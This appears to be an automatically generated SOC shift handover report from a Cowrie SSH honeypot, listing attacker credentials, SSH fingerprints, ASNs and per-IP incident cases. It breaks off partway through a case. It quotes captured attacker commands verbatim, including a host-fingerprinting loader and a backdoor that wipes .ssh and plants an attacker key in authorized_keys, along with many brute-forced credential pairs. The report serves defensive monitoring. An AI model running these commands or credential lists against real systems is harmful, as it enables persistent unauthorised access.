# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-21 |
| **Generated At** | 2026-07-21T19:37:47Z |
| **Shift Time** | 19:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **157** |
| Confirmed Threats | **144** |
| False Positives Filtered | **13** (8.3%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **26** |
| High Severity Cases | **102** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **3** HIGH · **30** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **142** |
| Unique Credential Pairs | **71** |
| Unique Usernames | **22** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **114** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `admin` | 21 |
| `mysql` | 12 |
| `ubnt` | 10 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 7 |
| `smo@@kkklss` | 6 |
| `123456` | 6 |
| `webmaster` | 6 |
| `555` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `smo@@kkklss` | 6 |
| `mysql` | `webmaster` | 6 |
| `ubnt` | `555` | 5 |
| `admin` | `admin123456789` | 5 |
| `admin` | `admin` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support2015` | `49.124.153.37` | 2026-07-21T16:55:37 |
| `ubnt` | `555` | `103.174.145.35` | 2026-07-21T16:57:29 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-21T16:57:42 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-21T16:57:42 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-21T16:57:44 |
| `ubnt` | `555` | `65.20.158.10` | 2026-07-21T17:00:46 |
| `ubnt` | `555` | `124.239.129.2` | 2026-07-21T17:00:56 |
| `ubnt` | `555` | `10.0.0.73` | 2026-07-21T17:01:07 |
| `root` | `123zxc123` | `103.167.89.222` | 2026-07-21T17:04:43 |
| `345gs5662d34` | `345gs5662d34` | `103.167.89.222` | 2026-07-21T17:04:47 |
| `root` | `3245gs5662d34` | `103.167.89.222` | 2026-07-21T17:04:49 |
| `blank` | `66` | `183.167.217.86` | 2026-07-21T17:10:08 |
| `blank` | `66` | `113.140.95.250` | 2026-07-21T17:10:18 |
| `mysql` | `123456` | `201.28.237.90` | 2026-07-21T17:12:55 |
| `mysql` | `123456` | `218.21.241.50` | 2026-07-21T17:13:04 |
| `blank` | `66` | `121.128.84.224` | 2026-07-21T17:13:36 |
| `blank` | `66` | `10.0.0.73` | 2026-07-21T17:14:04 |
| `admin` | `admin123456789` | `203.123.219.137` | 2026-07-21T17:15:47 |
| `admin` | `admin123456789` | `203.192.247.84` | 2026-07-21T17:16:00 |
| `mysql` | `123456` | `10.0.0.73` | 2026-07-21T17:16:51 |
| `admin` | `admin123456789` | `180.188.253.150` | 2026-07-21T17:18:45 |
| `admin` | `admin123456789` | `10.0.0.73` | 2026-07-21T17:19:06 |
| `admin` | `admin` | `27.79.4.201` | 2026-07-21T17:19:31 |
| `ubuntu` | `user1234567` | `10.0.0.73` | 2026-07-21T17:20:22 |
| `root` | `admin` | `171.243.150.251` | 2026-07-21T17:20:50 |
| `ubuntu` | `user1234567` | `185.242.3.195` | 2026-07-21T17:21:42 |
| `root` | `3` | `178.178.194.131` | 2026-07-21T17:22:02 |
| `installer` | `installer` | `27.79.4.201` | 2026-07-21T17:23:32 |
| `user` | `user` | `27.79.4.201` | 2026-07-21T17:25:22 |
| `root` | `3` | `62.122.195.14` | 2026-07-21T17:25:29 |
| `root` | `3` | `10.0.0.73` | 2026-07-21T17:25:49 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-21T17:26:22 |
| `ubnt` | `ubnt` | `171.243.150.251` | 2026-07-21T17:27:45 |
| `squid` | `squid` | `171.243.150.251` | 2026-07-21T17:28:59 |
| `root` | `qwerty1qaz` | `185.242.3.195` | 2026-07-21T17:29:04 |
| `supervisor` | `supervisor2005` | `223.82.97.51` | 2026-07-21T17:35:10 |
| `support` | `support` | `171.243.150.251` | 2026-07-21T17:35:18 |
| `supervisor` | `supervisor2005` | `210.245.95.11` | 2026-07-21T17:35:19 |
| `root` | `@` | `171.243.148.53` | 2026-07-21T17:35:56 |
| `oracle` | `12345678` | `60.214.127.246` | 2026-07-21T17:37:41 |
| `oracle` | `12345678` | `101.13.5.26` | 2026-07-21T17:37:50 |
| `user` | `user2004` | `82.65.140.218` | 2026-07-21T17:38:46 |
| `user` | `user2004` | `180.76.104.208` | 2026-07-21T17:38:56 |
| `oracle` | `12345678` | `10.0.0.73` | 2026-07-21T17:41:20 |
| `admin` | `admin@123` | `171.243.148.53` | 2026-07-21T17:42:15 |
| `admin` | `admin` | `94.154.43.60` | 2026-07-21T17:43:12 |
| `root` | `root123` | `171.243.150.251` | 2026-07-21T17:44:41 |
| `support` | `support` | `176.53.159.196` | 2026-07-21T17:45:45 |
| `blank` | `0` | `180.188.253.150` | 2026-07-21T17:46:42 |
| `support` | `support` | `10.0.0.73` | 2026-07-21T17:47:05 |
| `guest` | `guest` | `171.243.148.53` | 2026-07-21T17:48:42 |
| `blank` | `0` | `65.20.204.179` | 2026-07-21T17:50:11 |
| `blank` | `0` | `10.0.0.73` | 2026-07-21T17:50:16 |
| `test` | `test` | `171.243.148.53` | 2026-07-21T17:50:16 |
| `root` | `000000` | `2.57.122.168` | 2026-07-21T17:51:17 |
| `admin` | `0l0ctyQh243O63uD` | `171.243.148.53` | 2026-07-21T17:52:32 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-21T17:52:37 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-21T17:52:38 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-21T17:52:48 |
| `admin` | `password` | `171.243.150.251` | 2026-07-21T17:53:53 |
| `root` | `111111` | `2.57.122.168` | 2026-07-21T17:56:33 |
| `admin` | `1234` | `171.243.150.251` | 2026-07-21T17:56:57 |
| `admin` | `admin01` | `171.243.148.53` | 2026-07-21T18:00:00 |
| `admin` | `123456` | `171.243.148.53` | 2026-07-21T18:00:21 |
| `root` | `123` | `2.57.122.168` | 2026-07-21T18:00:35 |
| `admin` | `admin` | `47.236.161.139` | 2026-07-21T18:01:58 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-21T18:01:58 |
| `supervisor` | `supervisor2022` | `163.223.244.3` | 2026-07-21T18:02:08 |
| `user` | `9999999` | `202.111.183.30` | 2026-07-21T18:02:08 |
| `root` | `2222` | `115.241.228.34` | 2026-07-21T18:03:21 |
| `root` | `2222` | `117.205.2.250` | 2026-07-21T18:03:29 |
| `root` | `2222` | `10.0.0.73` | 2026-07-21T18:03:42 |
| `root` | `123123` | `2.57.122.168` | 2026-07-21T18:04:09 |
| `user` | `1234` | `171.243.150.251` | 2026-07-21T18:04:45 |
| `supervisor` | `supervisor2022` | `220.179.87.204` | 2026-07-21T18:05:07 |
| `supervisor` | `supervisor2022` | `117.70.94.155` | 2026-07-21T18:05:20 |
| `supervisor` | `supervisor2022` | `10.0.0.73` | 2026-07-21T18:05:33 |
| `user` | `9999999` | `10.0.0.73` | 2026-07-21T18:05:55 |
| `admin` | `default` | `171.243.150.251` | 2026-07-21T18:07:03 |
| `root` | `1234` | `2.57.122.168` | 2026-07-21T18:08:05 |
| `ftp` | `ftp` | `171.243.148.53` | 2026-07-21T18:10:57 |
| `nobody` | `1111` | `95.79.57.221` | 2026-07-21T18:11:00 |
| `root` | `12345` | `2.57.122.168` | 2026-07-21T18:11:18 |
| `operator` | `operator` | `171.243.148.53` | 2026-07-21T18:12:04 |
| `root` | `qwerty1qaz` | `10.0.0.73` | 2026-07-21T18:12:17 |
| `nobody` | `1111` | `190.12.109.162` | 2026-07-21T18:14:27 |
| `nobody` | `1111` | `10.0.0.73` | 2026-07-21T18:14:51 |
| `root` | `12345678` | `2.57.122.168` | 2026-07-21T18:18:22 |
| `donna` | `123donna` | `185.242.3.195` | 2026-07-21T18:20:58 |
| `root` | `123456789` | `2.57.122.168` | 2026-07-21T18:21:49 |
| `ubnt` | `ubnt2001` | `185.255.212.178` | 2026-07-21T18:25:05 |
| `root` | `1q2w3e4r` | `2.57.122.168` | 2026-07-21T18:25:09 |
| `ubnt` | `ubnt2001` | `116.53.130.4` | 2026-07-21T18:25:14 |
| `postgres` | `123qwe` | `200.89.159.59` | 2026-07-21T18:26:36 |
| `pi` | `p@ssword` | `50.217.40.11` | 2026-07-21T18:28:02 |
| `ubnt` | `ubnt2001` | `10.0.0.73` | 2026-07-21T18:28:30 |
| `root` | `654321` | `2.57.122.168` | 2026-07-21T18:28:32 |
| `root` | `P@ssw0rd` | `2.57.122.168` | 2026-07-21T18:31:58 |
| `root` | `admin` | `2.57.122.168` | 2026-07-21T18:35:18 |
| `mysql` | `webmaster` | `111.39.167.59` | 2026-07-21T18:35:40 |
| `mysql` | `webmaster` | `60.223.245.120` | 2026-07-21T18:35:49 |
| `root` | `admin123` | `2.57.122.168` | 2026-07-21T18:38:23 |
| `mysql` | `webmaster` | `178.216.165.187` | 2026-07-21T18:38:57 |
| `mysql` | `webmaster` | `117.191.83.250` | 2026-07-21T18:39:06 |
| `mysql` | `webmaster` | `10.0.0.73` | 2026-07-21T18:39:21 |
| `root` | `passw0rd` | `2.57.122.168` | 2026-07-21T18:41:53 |
| `root` | `password` | `2.57.122.168` | 2026-07-21T18:45:00 |
| `root` | `password1` | `2.57.122.168` | 2026-07-21T18:48:17 |
| `root` | `qwerty` | `2.57.122.168` | 2026-07-21T18:51:34 |
| `support` | `support2009` | `10.0.0.73` | 2026-07-21T18:51:37 |
| `admin` | `admin` | `47.82.122.57` | 2026-07-21T18:52:14 |
| `mysql` | `logon` | `10.0.0.73` | 2026-07-21T18:53:02 |
| `administrator` | `letmein` | `10.0.0.73` | 2026-07-21T18:54:46 |
| `root` | `root123` | `2.57.122.168` | 2026-07-21T18:54:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **157** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 39 |
| Go SSH scanner | 30 |
| AsyncSSH (Python) | 22 |
| Paramiko (Python) | 12 |
| libssh | 11 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 39 | 38 |
| `fda360b1b4f4...` | Mirai/variant | 22 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 1 |
| `a2de0f306611...` | Mirai/variant | 12 | 2 |
| `16443846184e...` | Generic scanner | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 39 | 38 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 22 | 3 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `16443846184e...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 18 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.167.89.222`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **57** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS7552` | Viettel Group | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (102)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6921ac49a6e9

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]37` |
| **First Seen** | 2026-07-21 16:55 |
| **Last Seen** | 2026-07-21 16:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:55:34` | `cowrie.session.connect` |
| `2026-07-21 16:55:35` | `cowrie.client.version` |
| `2026-07-21 16:55:35` | `cowrie.client.kex` |
| `2026-07-21 16:55:37` | `cowrie.login.success` |
| `2026-07-21 16:55:37` | `cowrie.direct-tcpip.request` |
| `2026-07-21 16:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]37` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebcc88a9e44

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-07-21 16:57 |
| **Last Seen** | 2026-07-21 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:57:26` | `cowrie.session.connect` |
| `2026-07-21 16:57:27` | `cowrie.client.version` |
| `2026-07-21 16:57:27` | `cowrie.client.kex` |
| `2026-07-21 16:57:29` | `cowrie.login.success` |
| `2026-07-21 16:57:29` | `cowrie.direct-tcpip.request` |
| `2026-07-21 16:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ae6d4307a5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 16:57 |
| **Last Seen** | 2026-07-21 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:57:42` | `cowrie.session.connect` |
| `2026-07-21 16:57:42` | `cowrie.client.version` |
| `2026-07-21 16:57:42` | `cowrie.client.kex` |
| `2026-07-21 16:57:42` | `cowrie.login.success` |
| `2026-07-21 16:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d6ba9f000f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 16:57 |
| **Last Seen** | 2026-07-21 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:57:42` | `cowrie.session.connect` |
| `2026-07-21 16:57:42` | `cowrie.client.version` |
| `2026-07-21 16:57:42` | `cowrie.client.kex` |
| `2026-07-21 16:57:42` | `cowrie.login.success` |
| `2026-07-21 16:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6788fd6f38

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 16:57 |
| **Last Seen** | 2026-07-21 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:57:44` | `cowrie.session.connect` |
| `2026-07-21 16:57:44` | `cowrie.client.version` |
| `2026-07-21 16:57:44` | `cowrie.client.kex` |
| `2026-07-21 16:57:44` | `cowrie.login.success` |
| `2026-07-21 16:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a0fc823f5f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 16:57 |
| **Last Seen** | 2026-07-21 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 16:57:44` | `cowrie.session.connect` |
| `2026-07-21 16:57:44` | `cowrie.client.version` |
| `2026-07-21 16:57:44` | `cowrie.client.kex` |
| `2026-07-21 16:57:44` | `cowrie.login.success` |
| `2026-07-21 16:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f4f12d08cbf

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-07-21 17:00 |
| **Last Seen** | 2026-07-21 17:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:00:44` | `cowrie.session.connect` |
| `2026-07-21 17:00:45` | `cowrie.client.version` |
| `2026-07-21 17:00:45` | `cowrie.client.kex` |
| `2026-07-21 17:00:46` | `cowrie.login.success` |
| `2026-07-21 17:00:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd5dc68a12e1

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-21 17:00 |
| **Last Seen** | 2026-07-21 17:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:00:52` | `cowrie.session.connect` |
| `2026-07-21 17:00:54` | `cowrie.client.version` |
| `2026-07-21 17:00:54` | `cowrie.client.kex` |
| `2026-07-21 17:00:56` | `cowrie.login.success` |
| `2026-07-21 17:00:57` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ec4a177752

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-07-21 17:04 |
| **Last Seen** | 2026-07-21 17:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:04:41` | `cowrie.session.connect` |
| `2026-07-21 17:04:41` | `cowrie.client.version` |
| `2026-07-21 17:04:42` | `cowrie.client.kex` |
| `2026-07-21 17:04:43` | `cowrie.login.success` |
| `2026-07-21 17:04:44` | `cowrie.session.params` |
| `2026-07-21 17:04:44` | `cowrie.command.input` |
| `2026-07-21 17:04:44` | `cowrie.command.failed` |
| `2026-07-21 17:04:44` | `cowrie.log.closed` |
| `2026-07-21 17:04:45` | `cowrie.session.params` |
| `2026-07-21 17:04:45` | `cowrie.command.input` |
| `2026-07-21 17:04:45` | `cowrie.session.file_download` |
| `2026-07-21 17:04:45` | `cowrie.log.closed` |
| `2026-07-21 17:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6861a7477fa3

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-07-21 17:04 |
| **Last Seen** | 2026-07-21 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:04:46` | `cowrie.session.connect` |
| `2026-07-21 17:04:46` | `cowrie.client.version` |
| `2026-07-21 17:04:46` | `cowrie.client.kex` |
| `2026-07-21 17:04:47` | `cowrie.login.success` |
| `2026-07-21 17:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b0004c55e3

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-07-21 17:04 |
| **Last Seen** | 2026-07-21 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:04:48` | `cowrie.session.connect` |
| `2026-07-21 17:04:48` | `cowrie.client.version` |
| `2026-07-21 17:04:48` | `cowrie.client.kex` |
| `2026-07-21 17:04:49` | `cowrie.login.success` |
| `2026-07-21 17:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b31e1b100bf

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-07-21 17:10 |
| **Last Seen** | 2026-07-21 17:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:10:05` | `cowrie.session.connect` |
| `2026-07-21 17:10:06` | `cowrie.client.version` |
| `2026-07-21 17:10:06` | `cowrie.client.kex` |
| `2026-07-21 17:10:08` | `cowrie.login.success` |
| `2026-07-21 17:10:09` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea321dd3168

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-21 17:10 |
| **Last Seen** | 2026-07-21 17:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:10:14` | `cowrie.session.connect` |
| `2026-07-21 17:10:15` | `cowrie.client.version` |
